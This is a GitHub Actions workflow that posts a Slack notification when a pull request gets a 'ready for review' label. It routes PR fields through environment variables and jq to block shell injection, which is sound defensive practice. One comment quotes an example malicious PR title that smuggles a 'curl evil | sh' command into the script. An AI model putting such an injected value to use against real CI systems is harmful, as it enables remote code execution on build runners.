name: Notify MCP team on "Ready for review" PRs

on:
  pull_request:
    types: [labeled]
  workflow_dispatch:

jobs:
  # Secrets cannot be read in a job-level `if`, so a small job reports whether the
  # webhook is configured. Without it notify-slack shows as skipped, not failed, and
  # starts posting on its own once SLACK_WEBHOOK_URL is set. An incoming webhook always
  # posts to the channel it was created for: #mcp-alert (C0AT8NH77PB).
  check-webhook:
    runs-on: ubuntu-latest
    outputs:
      configured: ${{ steps.check.outputs.configured }}
    steps:
      - name: Check SLACK_WEBHOOK_URL is configured
        id: check
        env:
          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
        run: |
          if [ -z "$SLACK_WEBHOOK_URL" ]; then
            echo "::warning::SLACK_WEBHOOK_URL secret is not set; skipping the Slack notification. Create an incoming webhook for #mcp-alert (channel C0AT8NH77PB) and store its URL in that secret."
            echo "configured=false" >> "$GITHUB_OUTPUT"
          else
            echo "configured=true" >> "$GITHUB_OUTPUT"
          fi

  notify-slack:
    needs: check-webhook
    if: needs.check-webhook.outputs.configured == 'true'
    runs-on: ubuntu-latest

    steps:
      - name: Check if label is ready for review
        if: github.event_name == 'pull_request'
        id: check-label
        env:
          LABEL_NAME: ${{ github.event.label.name }}
        run: |
          # Check if label contains 'ready for review' (case-insensitive)
          if ! echo "$LABEL_NAME" | grep -i 'ready for review' >/dev/null; then
            echo "Label does not contain 'ready for review' (case-insensitive), skipping notification."
            echo "should-continue=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi
          echo "should-continue=true" >> "$GITHUB_OUTPUT"
          
      - name: Add team-specific labels based on reviewers
        if: false
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PR_NR: ${{ github.event.pull_request.number }}
        run: |
          
          # Check if Buzok team is a code reviewer and add label if needed
          PR_REVIEWERS=$(gh pr view "$PR_NR" --json reviewRequests --jq '.reviewRequests[].name, .reviewRequests[].slug')
          echo "PR Reviewers: $PR_REVIEWERS"
          
          if echo "$PR_REVIEWERS" | grep -E "(datarobot-community/buzok|Buzok)" >/dev/null; then
            echo "Buzok team is a reviewer, adding label..."
            gh pr edit "$PR_NR" --add-label "Needs Review: GenAI Tooling (Buzok)"
          fi
          
          if echo "$PR_REVIEWERS" | grep -E "(datarobot-community/docs|Docs)" >/dev/null; then
            echo "Docs team is a reviewer, adding label..."
            gh pr edit "$PR_NR" --add-label "Needs Review: Docs"
          fi
          
      - name: Send notification to Slack
        if: github.event_name == 'pull_request' && steps.check-label.outputs.should-continue == 'true'
        # Event fields go through env and jq, never into the script text: a PR title
        # like `"; curl evil | sh; "` would otherwise run as shell.
        env:
          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
          PR_NR: ${{ github.event.pull_request.number }}
          PR_URL: ${{ github.event.pull_request.html_url }}
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
          PR_ADDITIONS: ${{ github.event.pull_request.additions }}
          PR_DELETIONS: ${{ github.event.pull_request.deletions }}
          REPO_NAME: ${{ github.event.repository.name }}
        run: |
          TEXT=":rocket: PR by ${PR_AUTHOR} needs a review:"$'\n'"<${PR_URL}|${REPO_NAME}#${PR_NR}: ${PR_TITLE}> \`+${PR_ADDITIONS} -${PR_DELETIONS}\`"
          jq -n --arg text "$TEXT" '{
            text: "*Pull Request Ready for Review!*",
            blocks: [{type: "section", text: {type: "mrkdwn", text: $text}}]
          }' | curl -sS --fail-with-body -X POST -H 'Content-type: application/json' \
            --data @- "${SLACK_WEBHOOK_URL}"
